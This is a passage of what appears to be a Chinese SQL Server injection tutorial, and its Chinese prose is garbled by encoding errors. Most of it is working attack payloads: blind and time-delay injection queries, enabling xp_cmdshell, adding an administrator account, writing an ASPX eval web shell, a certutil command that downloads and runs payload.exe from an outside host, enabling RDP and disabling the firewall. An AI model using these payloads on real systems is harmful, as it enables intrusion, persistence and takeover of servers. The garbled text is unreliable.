<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(str) åˆ¤æ–­å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">substring(str,start,len) æˆªå–å­—ç¬¦ä¸²çš„ä½œç”¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä»å“ªé‡Œå¼€å§‹æˆªå–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæˆªå–çš„é•¿åº¦</span><br><span class="line">ascii(char) æŠŠå­—ç¬¦è½¬æ¢ä¸ºasciiå€¼</span><br></pre></td></tr></table></figure>

<p><strong>æ•°æ®åº“ååˆ¤æ–­</strong></p>
<p>æ ¹æ®ï¼Œä½¿ç”¨<code>len()</code>æ¥çŒœæ•°æ®åº“åçš„é•¿åº¦æŸ¥è¯¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æ— å›æ˜¾ä¸‹è¯­å¥æ‰§è¡ŒæˆåŠŸ</span><br><span class="line">select count(*) from master.dbo.sysdatabases where dbid&#x3D;1 and len(name)&#x3D;6</span><br></pre></td></tr></table></figure>

<ul>
<li>çŒœæ•°æ®åº“åç§°çš„é•¿åº¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- å½“å‰åº“å</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and  len(db_name())&#x3D;11</span><br><span class="line"></span><br><span class="line">-- æ ¹æ®dbidä¾æ¬¡æŸ¥è¯¢æ•°æ®åº“å (è¿™é‡Œæ˜¯dbid&#x3D;1æ˜¯master)</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 1&#x3D;(select count(*) from master.dbo.sysdatabases where dbid&#x3D;1 and len(name)&#x3D;6)</span><br></pre></td></tr></table></figure>

<ul>
<li>é€å­—ç¬¦åˆ¤æ–­æ•°æ®åº“å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- å½“å‰åº“çš„å(æˆªå–å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦)</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and ascii(substring(db_name(),1,1))&#x3D;100</span><br><span class="line"></span><br><span class="line">-- æ ¹æ®dbidä¾æ¬¡æŸ¥è¯¢æ•°æ®åº“å(è¿™é‡Œæ˜¯dbid&#x3D;1æ˜¯master)</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 109&#x3D;ascii(substring((select name from master.dbo.sysdatabases where dbid&#x3D;1),1,1))</span><br></pre></td></tr></table></figure>

<p><strong>è¡¨ååˆ¤æ–­</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æŒ‡å®šæ•°æ®åº“db_18_8acefæŸ¥è¯¢è¡¨</span><br><span class="line">select name from db_18_8acef.dbo.sysobjects</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¤æ–­è¡¨åçš„é•¿åº¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- åˆ¤æ–­å½“å‰è¡¨çš„é•¿åº¦</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 9&#x3D;len((select name from db_18_8acef.dbo.sysobjects where name in (select name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)))</span><br><span class="line"> </span><br><span class="line"> -- è¿™ç§æ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and (select count(*) from db_18_8acef.dbo.sysobjects where name in (select top 1 name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and len(name)&#x3D;9)&#x3D;1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> -- ç¬¬äºŒä¸ªè¡¨å </span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 9&#x3D;len((select name from db_18_8acef.dbo.sysobjects where name in (select name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39; and name !&#x3D; &#39;ForgeRock&#39;)))</span><br><span class="line"> -- name !&#x3D; &#39;xx&#39; å¯ä»¥æ¢æˆ name not in (&#39;xx&#39;)</span><br></pre></td></tr></table></figure>

<ul>
<li>é€å­—ç¬¦åˆ¤æ–­è¡¨å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æˆªå–è¡¨åå­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 70&#x3D;ascii(substring((select name from db_18_8acef.dbo.sysobjects where name in (select name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)),1,1))</span><br><span class="line"></span><br><span class="line">-- è¿™ç§æ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and (select count(*) from db_18_8acef.dbo.sysobjects where name in (select top 1 name from db_18_8acef.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and ascii(substring(name,1,1))&#x3D;70)&#x3D;1</span><br></pre></td></tr></table></figure>

<p><strong>å­—æ®µå</strong></p>
<ul>
<li>å­—æ®µåé•¿åº¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æŸ¥è¯¢å½“å‰åº“ï¼Œå½“å‰ä½¿ç”¨è¡¨çš„å­—æ®µå</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and 11&#x3D;len((SELECT  top 1 column_name FROM information_schema.columns where column_name !&#x3D; &#39;description&#39;))</span><br><span class="line"> </span><br><span class="line">-- æŸ¥è¯¢æŒ‡å®šè¡¨çš„å­—æ®µ</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and  11&#x3D;len((SELECT TOP 1 column_name FROM information_schema.columns where table_name &#x3D; &#39;ForgeRock&#39; and column_name !&#x3D; &#39;productName&#39;))</span><br><span class="line"></span><br><span class="line">-- è¿™ç§æ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚çŸ¥é“äº†åº“åï¼Œè¡¨åï¼Œåˆ™å¯ä»¥åˆ©ç”¨syscolumns,sysobjectsè¿›è¡ŒæŸ¥è¯¢ã€‚ã€‚ã€‚å¦‚æœå­˜åœ¨å¤šä¸ªåŒåè¡¨åˆ™å¯ä»¥ä½¿ç”¨ !&#x3D; æ¥é™å®š</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and name not in (&#39;description&#39;) and len(name)&#x3D;11)</span><br></pre></td></tr></table></figure>

<ul>
<li>é€å­—ç¬¦åˆ¤æ–­å­—æ®µå</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æŸ¥è¯¢å½“å‰åº“ï¼Œå½“å‰ä½¿ç”¨è¡¨çš„å­—æ®µå</span><br><span class="line"> select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and ascii(substring((SELECT  top 1 column_name FROM information_schema.columns where column_name !&#x3D; &#39;description&#39;),1,1))&#x3D;112</span><br><span class="line"> </span><br><span class="line">-- æŸ¥è¯¢æŒ‡å®šè¡¨çš„å­—æ®µ</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and  112&#x3D;ascii(substring((SELECT TOP 1 column_name FROM information_schema.columns where table_name &#x3D; &#39;ForgeRock&#39; and column_name !&#x3D; &#39;description&#39;),1,1))</span><br><span class="line"></span><br><span class="line">-- è¿™ç§æ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and name not in (&#39;description&#39;) and unicode(substring(name,1,1))&#x3D;112)</span><br></pre></td></tr></table></figure>

<p><strong>å­—æ®µå†…å®¹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; and ascii(substring((select top 1 productName from ForgeRock),1,1))&#x3D;79</span><br></pre></td></tr></table></figure>

<h3 id="æ—¶é—´å»¶æ—¶ç›²æ³¨"><a href="#æ—¶é—´å»¶æ—¶ç›²æ³¨" class="headerlink" title="æ—¶é—´å»¶æ—¶ç›²æ³¨"></a>æ—¶é—´å»¶æ—¶ç›²æ³¨</h3><p>ä¸»è¦å‡½æ•°ï¼š<code>WAITFOR</code>,<code>IF exists()</code></p>
<p><code>WAITFOR</code>æ˜¯SQL Serverä¸­Transact-SQLæä¾›çš„â¼€ä¸ªæµç¨‹æ§åˆ¶è¯­å¥ã€‚å®ƒçš„ä½œâ½¤å°±æ˜¯ç­‰å¾…ç‰¹å®šæ—¶é—´ï¼Œç„¶åç»§ç»­æ‰§â¾å ç»­çš„è¯­å¥ã€‚å®ƒåŒ…å«â¼€ä¸ªå‚æ•°<code>DELAY</code>ï¼Œâ½¤æ¥æŒ‡å®šç­‰å¾…çš„æ—¶é—´ã€‚</p>
<p>å¦‚æœå°†è¯¥è¯­å¥æˆåŠŸæ³¨â¼Šåï¼Œä¼šé€ æˆæ•°æ®åº“è¿”å›è®°å½•å’Œ Webè¯·æ±‚ä¹Ÿä¼šå“åº”å»¶è¿Ÿç‰¹å®šçš„æ—¶é—´ã€‚ç”±äºè¯¥è¯­å¥ä¸æ¶‰åŠæ¡ä»¶åˆ¤æ–­ç­‰æƒ…å†µï¼Œæ‰€ä»¥å®¹æ˜“æ³¨â¼ŠæˆåŠŸã€‚æ ¹æ®Webè¯·æ±‚æ˜¯å¦æœ‰<code>å»¶è¿Ÿ</code>ï¼Œæ¸—é€æµ‹è¯•â¼ˆå‘˜å°±å¯ä»¥åˆ¤æ–­â½¹ç«™æ˜¯å¦å­˜åœ¨æ³¨â¼Šæ¼æ´ã€‚åŒæ—¶ï¼Œç”±äºè¯¥è¯­å¥å¹¶ä¸è¿”å›ç‰¹å®šå†…å®¹ï¼Œæ‰€ä»¥å®ƒä¹Ÿæ˜¯ç›²æ³¨çš„é‡è¦æ£€æµ‹â½…æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WAITFOR DELAY &#39;0:0:n&#39; -- è¯­æ³•</span><br><span class="line">WAITFOR DELAY &#39;0:0:4&#39; -- å»¶æ—¶4S</span><br><span class="line"></span><br><span class="line">-- ç¤ºä¾‹</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; WAITFOR DELAY &#39;0:0:2&#39;</span><br></pre></td></tr></table></figure>

<p><strong>æ•°æ®åº“å</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ dbid</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;1)&#x3D;1) waitfor delay &#39;0:0:1&#39;--</span><br></pre></td></tr></table></figure>

<ul>
<li>æ•°æ®åº“åé•¿åº¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- æ ¹æ®dbidä¾æ¬¡åˆ¤æ–­æ‰€æœ‰æ•°æ®åº“åé•¿åº¦</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;1 and len(name)&#x3D;6)&#x3D;1) waitfor delay &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- å½“å‰æ•°æ®åº“åé•¿åº¦</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select db_name()))&#x3D;11) waitfor delay &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<ul>
<li>é€å­—ç¬¦å­—ç¬¦åˆ¤æ–­</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- å½“å‰åº“</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(ascii(substring((select db_name()),1,1))&#x3D;100) waitfor delay &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- æŒ‡å®šæ•°æ® é€å­—ç¬¦åˆ¤æ–­</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (ascii(substring((Select Name FROM Master..SysDatabases where dbid&#x3D;8),1,1)) &#x3D; 100) WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<p><strong>æ•°æ®åº“ä¸­è¡¨å</strong></p>
<ul>
<li>è¡¨åé•¿åº¦(!= åˆ¤æ–­å…¶ä»–è¡¨å)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- å½“å‰åº“çš„è¡¨</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (len((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)))&#x3D;9) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- ä¾æ¬¡åˆ¤æ–­å…¶ä»–çš„è¡¨ã€‚ !&#x3D;</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (len((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and name !&#x3D;&#39;xx&#39;))&#x3D;9) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- ä¸€æ ·çš„</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and len(name)&#x3D;9)&#x3D;1) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>é€å­—ç¬¦çŒœè¡¨å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- é€å­—ç¬¦åˆ¤æ–­è¡¨å</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (ascii(substring((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;)),1,1))&#x3D;70) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- ä¾æ¬¡åˆ¤æ–­å…¶ä»–çš„è¡¨ã€‚ !&#x3D;</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if (ascii(substring((select name from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and name !&#x3D;&#39;xxxx&#39;),1,1))&#x3D;70) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- ä¸€æ ·çš„</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if ((select count(*) from db_18_ff6b8.dbo.sysobjects where name in (select top 1 name from db_18_ff6b8.dbo.sysobjects where xtype&#x3D;&#39;u&#39;) and ascii(substring(name,1,1))&#x3D;70)&#x3D;1) WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<p><strong>å­—æ®µå</strong></p>
<ul>
<li>å­—æ®µåé•¿åº¦(!= åˆ¤æ–­å…¶ä»–å­—æ®µå)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—æ®µçš„é•¿åº¦</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;)))&#x3D;11) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- ä¸€æ ·çš„</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(exists(select count(*) from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and len(name)&#x3D;11))  WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<ul>
<li>é€å­—ç¬¦åˆ¤æ–­å­—æ®µå</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—æ®µçš„å­—ç¬¦</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;)))&#x3D;11) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- ä¸€æ ·çš„</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(exists(select count(*) from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; &#39;ForgeRock&#39;) and ascii(substring(name,1,1))&#x3D;79))  WAITFOR DELAY &#39;0:0:2&#39;--</span><br></pre></td></tr></table></figure>

<p><strong>å­—æ®µå†…å®¹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--é•¿åº¦</span><br><span class="line">select productName from ForgeRock where productName &#x3D; &#39;OpenIDM&#39; if(len((select top 1 productName from ForgeRock))&#x3D;7) WAITFOR DELAY &#39;0:0:2&#39;--</span><br><span class="line"></span><br><span class="line">-- å†…å®¹</span><br><span class="line"></span><br><span class="line">-- å¯¹ï¼Œæœ€åçš„ç»™çœç•¥äº†ã€‚ã€‚ã€‚  ~.~</span><br></pre></td></tr></table></figure>

<h2 id="è°ƒç”¨ç³»ç»Ÿå‘½ä»¤"><a href="#è°ƒç”¨ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="è°ƒç”¨ç³»ç»Ÿå‘½ä»¤"></a>è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</h2><h3 id="å¼€å¯xp-cmdshell"><a href="#å¼€å¯xp-cmdshell" class="headerlink" title="å¼€å¯xp_cmdshell"></a>å¼€å¯xp_cmdshell</h3><p>xp_cmdshellæ˜¯Sql Serverä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>

<h3 id="æ— å›æ˜¾åˆ¤æ–­å‘½ä»¤æˆåŠŸä¸å¦"><a href="#æ— å›æ˜¾åˆ¤æ–­å‘½ä»¤æˆåŠŸä¸å¦" class="headerlink" title="æ— å›æ˜¾åˆ¤æ–­å‘½ä»¤æˆåŠŸä¸å¦"></a>æ— å›æ˜¾åˆ¤æ–­å‘½ä»¤æˆåŠŸä¸å¦</h3><p>DNSLog,ceyeâ€¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;ping -n 10 xxx.com&quot; --</span><br></pre></td></tr></table></figure>

<h3 id="DBAæƒé™æ–°å»ºç”¨æˆ·"><a href="#DBAæƒé™æ–°å»ºç”¨æˆ·" class="headerlink" title="DBAæƒé™æ–°å»ºç”¨æˆ·"></a>DBAæƒé™æ–°å»ºç”¨æˆ·</h3><p>å˜é‡æ˜¯åœ¨æ‰¹å¤„ç†æˆ–è¿‡ç¨‹çš„ä¸»ä½“ä¸­ç”¨ DECLARE è¯­å¥å£°æ˜çš„ï¼Œå¹¶ç”¨ SET æˆ– SELECT è¯­å¥èµ‹å€¼ã€‚ æ¸¸æ ‡å˜é‡å¯ä½¿ç”¨æ­¤è¯­å¥å£°æ˜ï¼Œå¹¶å¯ç”¨äºå…¶ä»–ä¸æ¸¸æ ‡ç›¸å…³çš„è¯­å¥ã€‚ é™¤éåœ¨å£°æ˜ä¸­æä¾›å€¼ï¼Œå¦åˆ™å£°æ˜ä¹‹åæ‰€æœ‰å˜é‡å°†åˆå§‹åŒ–ä¸º NULLã€‚</p>
<p><code>DECLARE @local_variable</code>: <code>@local_variable</code>å˜é‡çš„åç§°ã€‚ å˜é‡åå¿…é¡»ä»¥ at ç¬¦ (@) å¼€å¤´ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5&#39;;DECLARE @genp VARCHAR(8000);SET @genp&#x3D;0x6e657420757365722061646d696e746573742061646d696e202f616464;EXEC master..xp_cmdshell @genp--</span><br></pre></td></tr></table></figure>

<ul>
<li><code>5&#39;;EXEC master..xp_cmdshell &#39;net user an cc.123456 /add&#39;--</code></li>
<li><code>1&#39;;EXEC master..xp_cmdshell &#39;net user an cc.12341 /add&amp;&amp;net localgroup administrators an /add&#39;--</code></li>
</ul>
<h3 id="å†™ä¸€å¥è¯"><a href="#å†™ä¸€å¥è¯" class="headerlink" title="å†™ä¸€å¥è¯"></a>å†™ä¸€å¥è¯</h3><p>å‰ææ˜¯çŸ¥é“ï¼Œï¼Œï¼Œå¯¹å¯¹å¯¹ï¼Œå°±æ˜¯å®ƒï¼Œï¼Œï¼Œç»å¯¹è·¯å¾„å˜›ã€‚ã€‚ã€‚ å…¶å®å°±æ˜¯è°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤<code>echo</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;echo ccc&gt;c:\Inetpub\mssql-sql\1.txt&quot; --</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¸€å¥è¯</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cc&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#39;echo ^&lt;^%^@Page Language&#x3D;^&quot;^Jscript^&quot;^%^&gt;^&lt;^%^eval(Request.Item^[^&quot;cc^&quot;^]^,^&quot;unsafe^&quot;)^;^%^&gt;&gt;c:\Inetpub\mssql-sql\1.aspx&#39;--</span><br><span class="line"># æ³¨æ„ï¼å¦‚æœecho é‡Œé¢çš„å­—ç¬¦æœ‰å¼•å·å’Œå…¶ä»–ç¬¦å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦åœ¨å¼•å·å‰é¢åŠ ä¸€ä¸ª ^ æ¥è½¬ä¹‰å®ƒï¼è®°å¾—ç”¨å•å¼•å·åŒ…è£¹é‡Œé¢çš„ä¸€å¥è¯ï¼</span><br></pre></td></tr></table></figure>

<h3 id="Payloadæ‰§è¡Œ"><a href="#Payloadæ‰§è¡Œ" class="headerlink" title="Payloadæ‰§è¡Œ"></a>Payloadæ‰§è¡Œ</h3><p>åŸç†å°±æ˜¯è°ƒç”¨äº†<code>certutil</code>è¿›è¡Œä¸‹è½½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.90.128:9000&#x2F;payload.exe payload.exe&quot; --</span><br></pre></td></tr></table></figure>

<h3 id="å¼€å¯è¿œç¨‹æ¡Œé¢"><a href="#å¼€å¯è¿œç¨‹æ¡Œé¢" class="headerlink" title="å¼€å¯è¿œç¨‹æ¡Œé¢"></a>å¼€å¯è¿œç¨‹æ¡Œé¢</h3><ul>
<li>æ˜¯å¦å¼€å¯è¿œç¨‹æ¡Œé¢ï¼Œè¿”å›1è¡¨ç¤ºå…³é—­ï¼Œ0è¡¨ç¤ºå¼€å¯</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39; ,&#39;fDenyTSConnections&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¯»å–è¿œç¨‹æ¡Œé¢ç«¯å£</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#39;,&#39;PortNumber&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯è¿œç¨‹æ¡Œé¢ (æ–¹æ³•ä¸€)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯è¿œç¨‹æ¡Œé¢(æ–¹æ³•äºŒ)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ³¨å†Œè¡¨regæ–‡ä»¶å¼€å¯è¿œç¨‹</span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server]&quot;fDenyTSConnections&quot;&#x3D;dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\WinStations\RDP-Tcp]&quot;PortNumber&quot;&#x3D;dword:00000d3d</span><br><span class="line"></span><br><span class="line">ä¿å­˜c.regï¼Œå¹¶æ‰§è¡Œregedit &#x2F;s c.reg</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç¬¬ä¸€æ¬¡å¼€å¯è¿œç¨‹æ¡Œé¢ï¼Œéœ€è¦é…ç½®é˜²ç«å¢™è§„åˆ™å…è®¸è¿œç¨‹ç«¯å£ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Remote Desktop&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=<span class="number">3389</span> action=allow  <span class="comment"># é˜²ç«å¢™å…è®¸3389</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment"># å…³é—­é˜²ç«å¢™</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…³é—­è¿œç¨‹æ¡Œé¢</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,1;</span><br></pre></td></tr></table></figure>

<h3 id="æ—¥å¿—å¤‡ä»½è·Shell"><a href="#æ—¥å¿—å¤‡ä»½è·Shell" class="headerlink" title="æ—¥å¿—å¤‡ä»½è·Shell"></a>æ—¥å¿—å¤‡ä»½è·Shell</h3><p>å‚è€ƒï¼š</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVW9oZ0NDenYzYVZQUTJjT0dCZ29LUQ==">https://mp.weixin.qq.com/s/UohgCCzv3aVPQ2cOGBgoKQ<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>ä½æƒé™æƒ…å†µä¸‹ã€‚</p>
<p><code>LOGå¤‡ä»½</code>çš„è¦æ±‚æ˜¯ä»–çš„<code>æ•°æ®åº“å¤‡ä»½è¿‡</code>ï¼Œè€Œä¸”é€‰æ‹©æ¢å¤æ¨¡å¼<code>å¾—æ˜¯å®Œæ•´æ¨¡å¼</code>ï¼Œè‡³å°‘åœ¨<code>2008</code>ä¸Šæ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯ä½¿ç”¨logå¤‡ä»½<code>æ–‡ä»¶ä¼šå°çš„å¤š</code>ï¼Œå½“ç„¶å¦‚æœä½ çš„æƒé™å¤Ÿé«˜å¯ä»¥è®¾ç½®ä»–çš„æ¢å¤æ¨¡å¼ã€‚</p>
<ul>
<li>ä¿®æ”¹æ•°æ®åº“æ¢å¤ä¸ºå®Œæ•´æ¨¡å¼</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; ;alter database test set RECOVERY FULL -- </span><br></pre></td></tr></table></figure>

<ul>
